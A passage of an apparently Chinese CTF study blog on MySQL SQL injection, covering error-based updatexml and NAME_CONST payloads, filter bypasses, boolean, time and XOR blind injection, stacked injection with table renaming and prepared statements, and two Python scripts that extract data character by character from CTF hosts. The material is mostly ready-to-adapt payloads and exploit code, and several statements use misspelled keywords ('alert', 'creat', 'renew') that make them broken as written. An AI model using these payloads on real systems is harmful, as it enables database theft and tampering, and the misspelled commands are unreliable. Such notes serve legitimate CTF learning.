<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">1</span>),name_const(version(),<span class="hljs-number">1</span>))a;<br></code></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span><span class="hljs-keyword">sql</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></code></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://s3.ax1x.com/2020/11/13/D9tysH.png" alt="呜呜呜"></p>
<p>这方法只能爆个版本，不能爆有用数据，需要和join函数结合起来</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> users b)c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;id&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id))c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;username&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id, username))c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>我就喜欢updatexml,因为好理解，而且非常方便</p>
<p>爆库：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,database(),&#x27;</span>~<span class="hljs-string">&#x27;),1)#   //注意~有时候可以换为0x7e</span><br></code></pre></td></tr></table></figure>

<p>爆表：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="hljs-string">&#x27;),1) #</span><br></code></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>表名<span class="hljs-string">&#x27;),&#x27;</span>~<span class="hljs-string">&#x27;),1) #</span><br></code></pre></td></tr></table></figure>

<p>爆数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(admin,&#x27;</span>~<span class="hljs-string">&#x27;,password) from 数据库.表名)),1)#</span><br></code></pre></td></tr></table></figure>

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">爆表名<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database())),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>爆列名<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&quot;users&quot;</span>)),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>爆字段<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> users</span>)),1)#</span><br></code></pre></td></tr></table></figure>

<p>这就是报错注入，一般只要有报错，直接报错注入，很好用，过滤的话就是过滤and吧，</p>
<p>我们可以尝试大写绕过例如：And</p>
<p>或者两次的url加密</p>
<p>或者</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/!**and**/</span><br></code></pre></td></tr></table></figure>

<p>或者使用 || 和 &amp;&amp;(这个非常好用)</p>
<p>差不多报错就这些吧</p>
<p>补充：因为报错有字数限制，所以有时候获得的flag只有前面一般，所以我们还需要用到<code>left() right()</code></p>
<p>例如：(过滤了空格，等号)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">^</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">left</span>(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(H4rDsq1))),<span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">23</span><br>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">^</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">right</span>(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(H4rDsq1))),<span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>然后拼接起来就是了</p>
<p>flag{88ef73bf-fe5a-403e-a0a9-033a81b94d30}</p>
<p>有时候还需要用到<code>reverse</code> 逆序输出</p>
<p>例如<code>[RCTF2015]EasySQL</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>w0s1np&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;f&#x27;))),1))#<br></code></pre></td></tr></table></figure>

<p>报错使用的时候</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
<th align="center"></th>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">类别</td>
<td align="left">函数</td>
<td align="left">版本需求</td>
<td align="left">5.5.x</td>
<td align="left">5.6.x</td>
<td align="center">5.7.x</td>
<td align="left">8.x</td>
<td align="left">函数显错长度</td>
<td align="left">Mysql报错内容长度</td>
<td align="left">额外限制</td>
</tr>
<tr>
<td align="left">主键重复</td>
<td align="left">floor round</td>
<td align="left">❓</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="center">✔️</td>
<td align="left"></td>
<td align="left">64</td>
<td align="left"></td>
<td align="left">data_type ≠ varchar</td>
</tr>
<tr>
<td align="left">列名重复</td>
<td align="left">name_const</td>
<td align="left">❓</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="center">✔️</td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">only version()</td>
</tr>
<tr>
<td align="left">列名重复</td>
<td align="left">join</td>
<td align="left">[5.5.49, ?)</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="center">✔️</td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">only columns</td>
</tr>
<tr>
<td align="left">数据溢出 - Double</td>
<td align="left">1e308 cot exp pow</td>
<td align="left">[5.5.5, 5.5.48]</td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">MYSQL_ERRMSG_SIZE</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">数据溢出 - BIGINT</td>
<td align="left">1+~0</td>
<td align="left">[5.5.5, 5.5.48]</td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">MYSQL_ERRMSG_SIZE</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">几何对象</td>
<td align="left">geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
<td align="left">[?, 5.5.48]</td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">244</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">空间函数 Geohash</td>
<td align="left">ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
<td align="left">[5.7, ?)</td>
<td align="left"></td>
<td align="left"></td>
<td align="center">✔️</td>
<td align="left">✔️</td>
<td align="left">128</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">GTID</td>
<td align="left">gtid_subset gtid_subtract</td>
<td align="left">[5.6.5, ?)</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="center">✔️</td>
<td align="left">✔️</td>
<td align="left">200</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">JSON</td>
<td align="left">json_*</td>
<td align="left">[5.7.8, 5.7.11]</td>
<td align="left"></td>
<td align="left"></td>
<td align="center">✔️</td>
<td align="left"></td>
<td align="left">200</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">UUID</td>
<td align="left">uuid_to_bin bin_to_uuid</td>
<td align="left">[8.0, ?)</td>
<td align="left"></td>
<td align="left"></td>
<td align="center"></td>
<td align="left">✔️</td>
<td align="left">128</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">XPath</td>
<td align="left">extractvalue updatexml</td>
<td align="left">[5.1.5, ?)</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="center">✔️</td>
<td align="left">✔️</td>
<td align="left">32</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>当遇到没回显，不报错怎么办</p>
<h3 id="无回显无报错的盲注"><a href="#无回显无报错的盲注" class="headerlink" title="无回显无报错的盲注"></a>无回显无报错的盲注</h3><p>常见盲注方法：布尔盲注，时间盲注，状态码注入，笛卡尔积盲注</p>
<p>布尔盲注：<code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code></p>
<p>时间盲注：<code>if(ascii(substr(database(),1,1))=114,1,sleep(5))</code></p>
<p>状态码盲注：<code>if((select ascii(substr(database(),1,1)))&gt;1,1,(select 1 from mysql.user))</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>), <span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> mysql.user));<br># 输出: <span class="hljs-number">1</span><br><br><span class="hljs-keyword">select</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">0</span>), <span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> mysql.user));<br># 报错: ERROR <span class="hljs-number">1242</span> (<span class="hljs-number">21000</span>): Subquery <span class="hljs-keyword">returns</span> more than <span class="hljs-number">1</span> <span class="hljs-type">row</span><br></code></pre></td></tr></table></figure>

<p>笛卡尔积延时注入：（原理：<code>count(*)</code> 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，从而达到延时注入的效果）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>whoami<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select 1),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</span><br><span class="hljs-string">[OUTPUT:]</span><br><span class="hljs-string">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=whoami&amp;password=1&#x27;</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">0</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C),<span class="hljs-number">0</span>);#<br>[OUTPUT:]<br>HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span> <span class="hljs-number">200</span>    # 没有延时<br></code></pre></td></tr></table></figure>

<p>这里放一个盲注脚本吧，可以根据题目自行修改：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://e3a1c4b6-8190-40c1-86c3-890c11354d89.node3.buuoj.cn/?stunum=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span>( <span class="hljs-literal">True</span> ):<br>	i = i + <span class="hljs-number">1</span> <br>	head=<span class="hljs-number">32</span><br>	tail=<span class="hljs-number">127</span><br><br>	<span class="hljs-keyword">while</span>( head &lt; tail ):<br>		mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br>		<span class="hljs-comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span><br>		<span class="hljs-comment">#payload = &quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span><br>		payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(value)from(ctf.flag)),%d,1))&gt;%d,1,0)&quot;</span> % (i , mid)<br><br>		r = requests.get(url+payload)<br>		r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>		<span class="hljs-comment">#print(url+payload)</span><br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;your score is: 100&quot;</span> <span class="hljs-keyword">in</span> r.text :<br>			head = mid + <span class="hljs-number">1</span><br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-comment">#print(r.text)</span><br>			tail = mid<br>	<br>	last = result<br>	<br>	<span class="hljs-keyword">if</span> head!=<span class="hljs-number">32</span>:<br>		result += <span class="hljs-built_in">chr</span>(head)<br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-keyword">break</span><br>	<span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>



<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>常见修改数据库语句：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> - 创建新数据库<br>alert <span class="hljs-keyword">database</span>- 修改数据库<br>creat <span class="hljs-keyword">table</span> - 创建新表<br>alert <span class="hljs-keyword">table</span> - 变更（改变）数据库表<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> - 删除表<br>creat <span class="hljs-keyword">index</span> - 创建索引（搜索键）<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">index</span> - 删除索引<br></code></pre></td></tr></table></figure>

<p>之前都没咋用到过，就是在<code>随便注</code>里面出现才学习了下，这里就以该题为例：</p>
<p>  <img src="https://s3.ax1x.com/2020/11/28/DsGjQP.png" alt="fef"></p>
<p>  尝试了下，有回显，有报错，直接union注入，通过order by字段为2；结果发现：</p>
<p>  <img src="https://s3.ax1x.com/2020/11/28/DsJPij.png" alt="dwa"></p>
<p>  过滤了select,这就难搞了，你要获得最后字段的结果都需要用到<code>select</code>呀，就需要用到堆叠了</p>
<p>爆表，爆表，</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p>  <img src="https://s3.ax1x.com/2020/11/28/DsJQY9.png" alt="awff"></p>
<p>  两个表，然后输出列，</p>
  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>  <img src="https://s3.ax1x.com/2020/11/28/DsJNwD.png" alt="fwwef"></p>
  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>  <img src="https://s3.ax1x.com/2020/11/28/DsJwYd.png" alt="fae"></p>
<p>因为正常输入个1得到的是1和<code>hahaha</code>，如果默认查询<code>19.....</code>表名的字段，那么就会显示<code>flag</code>了，所以这里默认查询<code>word</code>表名的字段，因为也不能<code>select</code>，只有通过修改表名，把<code>19....</code>当成默认的，这里就需要<code>renew</code>和<code>alert（alert 添加、修改、删除字段）</code>了，首先我们需要把<code>word</code>表名让出来，所以先来<code>1&#39;;renew tables &#39;word&#39; to &#39;word1&#39;;</code>再把<code>19....</code>换成<code>word1</code>   <code>1&#39;;renew tables &#39;word&#39; to &#39;word1&#39;;renew tables &#39;19....&#39; to &#39;word&#39;;</code>因为<code>19....</code>表少了一个列，所以要添加一个，所以使用<code>alert table &#39;word&#39; change &#39;flag&#39; &#39;id&#39; varchar(100)#</code>,所以总的payload如下：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;renew tables &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27; to &#x27;</span>word1<span class="hljs-string">&#x27;;renew tables &#x27;</span><span class="hljs-number">19.</span>..<span class="hljs-string">&#x27; to &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27;;alert table &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27; change &#x27;</span>flag<span class="hljs-string">&#x27; &#x27;</span>id<span class="hljs-string">&#x27; varchar(100)#</span><br></code></pre></td></tr></table></figure>

<p> 所以我们只要输入万能密码进去即可：1’ or ‘1’=’1</p>
<p>  <img src="https://s3.ax1x.com/2020/11/28/DsY1Ag.png" alt="fesf"></p>
<p>感觉难得就是想到默认表名和换表名了。值得思考下renew和alert。这里记一下他们的作用：</p>
<p>rename - 重命名</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">rename tables `words` to `word1`<br></code></pre></td></tr></table></figure>

<p>重命名表<code>words</code>为<code>word1</code></p>
<p>alter - 变更列</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">alter table `words` change `flag` `id` varchar(<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure>

<p>变更表<code>words</code>中的列<code>flag</code>为<code>id</code> 且其性质为<code>varchar(100)</code></p>
<p>mysql</p>
<ol>
<li><p>创建表：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;creat <span class="hljs-keyword">table</span> test <span class="hljs-keyword">like</span> users;<br></code></pre></td></tr></table></figure></li>
<li><p>删除表</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> test;<br></code></pre></td></tr></table></figure></li>
<li><p>查询数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">1</span>;select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure></li>
<li><p>修改数据</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;100&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
</ol>
<p>该题还有一种方式，就是使用PDO预编译</p>
<p>MySQL的预编译语法为：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>用于设置变量名和值<br><span class="hljs-keyword">prepare</span>用于预备一个语句，并赋予名称，以后可以引用该语句<br><span class="hljs-keyword">execute</span>执行语句<br><span class="hljs-keyword">deallocate</span> <span class="hljs-keyword">prepare</span>用来释放掉预处理的语句<br></code></pre></td></tr></table></figure>

<p>直接payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="hljs-string">&#x27;,&#x27;</span>lect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span><br></code></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">拆分开来如下<br>-1&#39;;<br>set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);<br>prepare stmt from @sql;<br>EXECUTE stmt;<br>#<br></code></pre></td></tr></table></figure>



<h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>其实也就相当于盲注，就是当and or这些逻辑运算符被过滤了的时候使用</p>
<p>两个同为真的条件做异或，结果为假</p>
<p>两个同为假的条件做异或，结果为假</p>
<p>一个条件为真，一个条件为假，结果为真</p>
<p><code>null</code>与任何条件（真、假、null）做异或，结果都为<code>null</code></p>
<p>基本payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;^(ascii(mid((password)from(i)))&gt;j)^&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<p>最前面和最后面的语句都固定为真（逻辑结果都为1），只有中间的语句不确定真假</p>
<p><strong>那么整个payload的逻辑结果都由中间的语句决定</strong>，我们就可以用这个特性来判断盲注的结果了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>^<span class="hljs-number">1</span>^<span class="hljs-number">0</span> --&gt; <span class="hljs-number">1</span> 语句返回为真<br><span class="hljs-attribute">0</span>^<span class="hljs-number">0</span>^<span class="hljs-number">0</span> --&gt; <span class="hljs-number">0</span> 语句返回为假<br></code></pre></td></tr></table></figure>

<p>就可以以此构招脚本跑了</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://web43.buuoj.cn/index.php&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>        payload = <span class="hljs-string">&#x27;1^(cot(ascii(substr((select(flag)from(flag)),&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;,1))&gt;&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;))^1=1&#x27;</span><br>        <span class="hljs-built_in">print</span>(payload)<br>        r = requests.post(url, data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;)<br><br>        <span class="hljs-keyword">if</span> r.text.find(<span 